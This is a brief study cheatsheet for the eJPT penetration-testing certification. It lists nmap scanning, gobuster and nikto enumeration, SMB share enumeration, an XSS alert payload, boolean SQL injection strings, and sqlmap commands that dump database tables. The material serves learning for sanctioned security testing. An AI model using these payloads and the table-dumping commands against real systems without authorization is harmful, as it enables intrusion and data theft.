# **eJPT Cheatsheet**

## **Adding route to the network**
```console
root@kali~$ip a | grep tap0 | awk '/inet/ {print $2}'
root@kali~$ ip route add <ip/subnet> via <current ip gateway>
```
## **Checking for for alive host** 
```console
root@kali~$nmap -sn <ip/subnet> | grep "report for" | cut -d " " -f 5 > ip.txt
```
## **Scan all IP address**
```console
root@kali~$ports=$(nmap -p- --min-rate=1000 -T4 <ip> | grep ^[0-9] | cut -d ‘/’ -f 1 | tr ‘\n’ ‘,’ | sed s/,$//)
root@kali~$nmap -sV -sC -p$ports <ip> -oG <name of file>
```

## **Vulnerability scanning using nmap**
```console
Its help me a lot to validate some vulnerablities.

root@kali~$ nmap --script "type of scanner" <IP>
```

## **Directory Enumeration**

```console
root@kali~$gobuster dir -u http://<IP> -w <wordlist>
```
## **Web vulnerability scanning**
```console
root@kali~$nikto -h <IP>
```
## **Cross Site Scripting**
```console
- Look for any input forms.
- use <script>alert(1)</script>
```
## **SQL Injection**
```console
- Look for any input forms.
- put "'" after a string, SQL error message prompt. 

Boolean Injection:

AND 1=1; -- -
OR 'a'='a'; -- -

Tip: If your doing manual SQLi validation, you can automate it using burp suite.

Once the target is validate with SQLi, used sqlmap to automate things up.

root@kali~$sqlmap -u <url> 
root@kali~$sqlmap -u <url> -p <parameter>
root@kali~$sqlmap -u <url> --tables
root@kali~$sqlmap -u <url> -D <database name> -T <table name> --dump
```
## **Windows Shares Enumeration**
```console
enumerate shared directory.

root@kali~$smbclient -L //ip 
root@kali~$enum4linux -a ip_address
```
## **Windows folder enumeration**
```console
C:\Users\NT-AUTHORITY> dir /s /b 
```
